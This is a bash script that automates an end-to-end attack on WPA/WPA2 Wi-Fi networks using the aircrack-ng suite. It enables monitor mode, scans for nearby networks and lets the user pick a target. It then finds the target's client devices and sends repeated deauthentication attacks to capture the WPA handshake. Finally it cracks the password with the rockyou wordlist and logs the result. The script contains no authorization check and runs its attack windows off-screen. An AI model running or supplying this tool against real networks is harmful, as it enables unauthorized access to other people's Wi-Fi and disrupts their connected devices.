#!/bin/bash
sudo apt update
sudo apt install aircrack-ng -y
sudo airmon-ng check kill


# Check if wlan0 is available
if iw dev wlan0 info &> /dev/null; then
    if iwconfig wlan0 | grep -q "Mode:Monitor"; then
        :
    else
        sudo airmon-ng start wlan0
    fi
fi



UN=$SUDO_USER
current_date=$(date +"%d_%m_%y")
path="/home/$UN/Desktop/wifi_Targets"
scan_input="$path/Scan/Scan-$current_date.csv"
mkdir -p "$path"
mkdir -p "$path/Scan"
sudo chown -R $UN:$UN $path



# Scan 10 seconds for wifi networks
sudo gnome-terminal --geometry=93x35-10000-10000 -- timeout 10s sudo airodump-ng wlan0mon --output-format csv -w $path/Scan/Scan-$current_date

countdown_duration=10
echo -e "\e[1;34mScanning for available WiFi Networks ($countdown_duration s):\e[0m"

for (( i=$countdown_duration; i>=0; i-- )); do
    tput cuu1 && tput el
    echo -e "\e[1;34mScanning for available WiFi Networks ($i s):\e[0m"
    sleep 1
done


mv $path/Scan/Scan-$current_date-01.csv $scan_input
cp "$scan_input" "$scan_input.original"


# Edit original scan file to more orgenized one:
awk -F, 'BEGIN {OFS=","} {print $1, $4, $6, $14}' "$scan_input" > "$scan_input.tmp"  && mv "$scan_input.tmp" "$scan_input"
awk '/^Station MAC,/ {print; exit} {print}' "$scan_input" > "$scan_input.tmp"  && mv "$scan_input.tmp" "$scan_input"
awk '$4 == "" {$4 = "*Hidden*"} 1' "$scan_input" > "$scan_input.tmp"  && mv "$scan_input.tmp" "$scan_input"   
tail -n +3 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"
head -n -2 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"   


clear
echo -e "\033[1;33mAvalible WiFi Networks:\033[0m\n"


# Display the scan input file contents with row numbers
printf "    Name: %-22s Encryption: %-4s BSSID: %-5s\n" 
echo
nl -w2 -s', ' "$scan_input" | awk -F', ' '{printf "%-1s. %-28s %-16s %-5s\n", $1, $5, $4, $2}'
echo

# Prompt the user to choose a row number
read -p "Enter row number: " row_number
echo
chosen_row=$(awk -v row="$row_number" 'NR == row' "$scan_input")
bssid_address=$(echo "$chosen_row" | awk -F', ' '{print $1}')
channel=$(echo "$chosen_row" | awk -F', ' '{print $2}')
encryption=$(echo "$chosen_row" | awk -F', ' '{print $3}')
bssid_name=$(echo "$chosen_row" | awk -F', ' '{print $4}')



# Echo values
echo -e "\033[1;31m\033[1mBSSID Name:\033[0m $bssid_name"
echo -e "\033[1;31m\033[1mMAC Address:\033[0m $bssid_address"
if [ "$encryption" = "OPN" ]; then
    echo -e "\033[1;31m\033[1mEncryption:\033[0m none"
else
    echo -e "\033[1;31m\033[1mEncryption:\033[0m $encryption"
fi
echo -e "\033[1;31m\033[1mChannel:\033[0m $channel"
echo
echo

if [ "$encryption" = "WPA3" ]; then
    echo -e "\033[1mThe encryption is WPA3. Can't crack it yet.\033[0m"
    exit 1
elif [ "$encryption" = "OPN" ]; then
    echo -e "\033[1mThe Network is open.\033[0m" 
    exit 1
fi



# if directory exist from previous scan then delete it & create new
if [ -d $path/"$bssid_name" ]; then
    rm -r $path/"$bssid_name"
fi
mkdir $path/"$bssid_name"



# Scan 10 seconds if network on:
gnome-terminal --geometry=93x15-10000-10000 -- script -c "sudo airodump-ng -c $channel -w '$path/$bssid_name/$bssid_name' -d $bssid_address wlan0mon" "$path/$bssid_name/airodump_output.txt" &
sleep 10

# Check if the network exists
if [ "$(grep -c "$bssid_address" "$path/$bssid_name/airodump_output.txt")" -lt 2 ]; then
    sudo pkill airodump-ng
    echo -e "\033[1mThe Network appear to be offline now.\033[0m"
    rm -r $path/"$bssid_name"
    exit 1
fi

# Scan for devices for 1 minute
for ((i=1; i<=10; i++)); do
    target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$path/$bssid_name/$bssid_name-01.kismet.netxml")

    if [ -n "$target_devices" ]; then
        echo -e "\033[1;33m\nDevices_Found:\033[0m $target_devices" | tr ' ' '\n'
        echo
        break
    fi
    echo -e "Scanning for devices..  \e[1;34m$i/10\e[0m"
    sleep 6
done


if [ -z "$target_devices" ]; then
    echo -e "\033[1m\nNo device were found.\033[0m"
    sudo pkill airodump-ng
    rm -r $path/"$bssid_name"
    exit 1
fi

sleep 3

# Check if we capture the handshake - Before the attack:
if sudo grep -q "WPA handshake: $bssid_address" "$path/$bssid_name/airodump_output.txt"; then
    echo -e "\033[1;32m->> Got the handshake!\033[0m"
    sudo pkill aireplay-ng
    sudo pkill airodump-ng
    echo
    echo --- >> $path/wifi_passwords.txt
    echo "We got handshake for:    	$bssid_name                   .     at $(date +"%H:%M %d/%m/%y")" >> "$path/wifi_passwords.txt"


# Starting deauth attack and waiting for handshake:      
else
    echo -e "\033[1m\nStarting deauth attack ->>\033[0m"
    # trying 10 times (3 minutes) the deauth attack
    for ((i=1; i<=10; i++)); do        
        target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$path/$bssid_name/$bssid_name-01.kismet.netxml")
        
        for target_device in $target_devices; do
            gnome-terminal --geometry=1x1-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 0 -a "$bssid_address" -c "$target_device" wlan0mon
        done
        
        echo -e "Attempt \e[1;34m$i/10\e[0m to capture handshake of:"         
        echo -e "$target_devices" | tr ' ' '\n',
        echo
        # waiting 18 sec after deauth attack while looking for handshake:
        for ((j=1; j<=18; j++)); do
            sleep 1
	    if sudo grep -q "WPA handshake: $bssid_address" "$path/$bssid_name/airodump_output.txt"; then
                echo -e "\033[1;32m->> Got the handshake!\033[0m"
                sudo pkill aireplay-ng
	        sudo pkill airodump-ng
	        echo
	        echo --- >> $path/wifi_passwords.txt
	        echo "We got handshake for:   $bssid_name                  ($(date +"%H:%M %d/%m/%y"))" >> "$path/wifi_passwords.txt"
	        break 2
	    fi    
        done
    # after 6 unseccessfull attempts, quit the script:
    if [ "$i" == 10 ]; then
    	echo -e "\033[1m\nNo handshake obtained within 2 minutes.\033[0m"
    	sudo pkill aireplay-ng
        sudo pkill airodump-ng
        rm -r $path/"$bssid_name"
	exit 1
    fi    
  
    done       
fi


sudo chown -R $UN:$UN $path


# Cracking the Password
echo -e "\e[1m\nCracking the wifi password with rockyou wordlist ->>\n\e[0m"


sudo aircrack-ng "$path/$bssid_name/$bssid_name"*.cap -w /usr/share/wordlists/rockyou.txt -l "$path/$bssid_name/$bssid_name-wifi_password.txt"
echo
if [ -f "$path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
    wifi_pass=$(cat "$path/$bssid_name/$bssid_name-wifi_password.txt")
    echo -e "The wifi password of \033[1;31m\033[1m$bssid_name\033[0m is:	\033[1;31m\033[1m$wifi_pass\033[0m"
    echo "The wifi password is:   $wifi_pass" >> $path/wifi_passwords.txt
else
    echo -e "\nCouldn't finf a match from rockyou wordlist.."
fi





# Disable monitor mode
gnome-terminal --geometry=1x1-10000-10000 -- sudo airmon-ng stop wlan0mon
gnome-terminal --geometry=1x1-10000-10000 -- sudo systemctl start NetworkManager
